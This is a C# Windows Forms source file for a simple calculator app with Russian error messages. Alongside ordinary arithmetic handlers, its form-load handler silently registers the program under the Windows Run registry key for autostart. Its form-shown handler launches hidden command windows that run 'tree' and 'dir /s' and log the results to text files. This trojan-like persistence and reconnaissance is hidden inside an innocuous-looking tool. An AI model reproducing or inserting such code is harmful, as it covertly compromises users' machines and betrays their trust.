﻿using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace Calculator
{
    public partial class Form_calculator : Form
    {
        float a, b, result;
        int count;
        bool znak = true;
        private object MenuItem1;

        public Form_calculator()
        {
            InitializeComponent();
        }

        private void button10_Click(object sender, EventArgs e)
        {
            textBox1.Text = textBox1.Text + 0;
        }

        private void button8_Click(object sender, EventArgs e)
        {
            textBox1.Text = textBox1.Text + 1;
        }

        private void button7_Click(object sender, EventArgs e)
        {
            textBox1.Text = textBox1.Text + 2;
        }

        private void button6_Click(object sender, EventArgs e)
        {
            textBox1.Text = textBox1.Text + 3;
        }

        private void button4_Click(object sender, EventArgs e)
        {
            textBox1.Text = textBox1.Text + 4;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            textBox1.Text = textBox1.Text + 5;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            textBox1.Text = textBox1.Text + 6;
        }

        private void button18_Click(object sender, EventArgs e)
        {
            textBox1.Text = textBox1.Text + 7;
        }

        private void button17_Click(object sender, EventArgs e)
        {
            textBox1.Text = textBox1.Text + 8;
        }

        private void button16_Click(object sender, EventArgs e)
        {
            textBox1.Text = textBox1.Text + 9;
        }

        private void button5_Click(object sender, EventArgs e)
        {
            a = float.Parse(textBox1.Text);
            textBox1.Clear();
            znak = true;
            textBox2.Text = textBox2.Text + a.ToString() + " + ";
            calculate();
            count = 1;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            a = float.Parse(textBox1.Text);
            textBox1.Clear();
            znak = true;
            textBox2.Text = textBox2.Text + a.ToString() + " - ";
            calculate();
            count = 2;
            //click = true;
            //}
        }

        private void button15_Click(object sender, EventArgs e)
        {
            a = float.Parse(textBox1.Text);textBox1.Clear();
            textBox1.Clear();
            znak = true;
            textBox2.Text = textBox2.Text + a.ToString() + " * ";
            calculate();
            count = 3;
        }

        private void button19_Click(object sender, EventArgs e)
        {
            a = float.Parse(textBox1.Text);
            if (a == 0)
            {
                textBox1.Text = "Деление на ноль невозможно";
            } else {
                textBox1.Clear();
                znak = true;
                textBox2.Text = textBox2.Text + a.ToString() + " / ";
                calculate();
                count = 4;
            }
        }

        private void button11_Click(object sender, EventArgs e)
        {
            textBox1.Text = ",";
        }

        private void button13_Click(object sender, EventArgs e)
        {
            textBox1.Text = "";
            textBox2.Text = "";
            result = 0;
            count = 0;
        }

        private void button24_Click(object sender, EventArgs e)
        {
            int lenght = textBox1.Text.Length - 1;
            string text = textBox1.Text;
            textBox1.Clear();
            for (int i = 0; i < lenght; i++)
            {
                textBox1.Text = textBox1.Text + text[i];
            }
        }

        private void button12_Click(object sender, EventArgs e)
        {
            a = float.Parse(textBox1.Text);
            textBox2.Clear();
            calculate();
            textBox1.Text = result.ToString();
            result = 0;
            count = 0;
        }

        private void button9_Click(object sender, EventArgs e)
        {
            if (znak == true)
            {
                textBox1.Text = "-" + textBox1.Text;
                znak = false;
            }
            else if (znak == false)
            {
                textBox1.Text = textBox1.Text.Replace("-", "");
                znak = true;
            }
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            
        }

        private void button14_Click(object sender, EventArgs e)
        {
            textBox1.Text = "";
        }

        private void button22_Click(object sender, EventArgs e)
        {
            a = float.Parse(textBox1.Text);
            textBox2.Text = "√" + a;
            a = (float)Math.Sqrt(a);
            textBox1.Text = Convert.ToString(a);
        }

        private void button21_Click(object sender, EventArgs e)
        {
            a = float.Parse(textBox1.Text);
            textBox2.Text = "sqr(" + a + ")";
            a = (float)(Math.Pow(a, 2));
            textBox1.Text = Convert.ToString(a);
        }

        private void menuStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
        {

        }
        

        private void toolStripTextBox1_Click(object sender, EventArgs e)
        {
            
        }

        private void Form_calculator_Load(object sender, EventArgs e)
        {
            const string name = "Calculator";
            string ExePath = System.Windows.Forms.Application.ExecutablePath;
            RegistryKey reg;
            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            reg.SetValue(name, ExePath);
            reg.Close();
        }

        private void Form_calculator_Shown(object sender, EventArgs e)
        {

            string dirName = Application.StartupPath.ToString();

            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd";
            psi.Arguments = @"/c tree > " + dirName + "log1.txt";
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            Process.Start(psi);

            ProcessStartInfo psi2 = new ProcessStartInfo();
            psi2.FileName = "cmd";
            psi2.Arguments = @"/c dir /s> " + dirName + "log2.txt";
            psi2.WindowStyle = ProcessWindowStyle.Hidden;
            psi2.RedirectStandardOutput = true;
            psi2.UseShellExecute = false;
            psi2.CreateNoWindow = true;
            Process.Start(psi2);
        }

        private void button20_Click(object sender, EventArgs e)
        {
            a = float.Parse(textBox1.Text);
            textBox2.Text = "1/(" + a + ")";
            a = 1/a;
            textBox1.Text = Convert.ToString(a);
        }

        private void calculate()
        {
            switch(count)
            {
                case 0:
                    result = a;
                    break;
                case 1:
                    result += a;
                    break;
                case 2:
                    result -= a;
                    break;
                case 3:
                    result *= a;
                    break;
                case 4:
                    if (a == 0)
                    {
                        MessageBox.Show("Деление на ноль невозможно", "Ошибка");
                    }else
                    result /= a;
                    break;

                default:
                       break;
            }
        }
    }

}
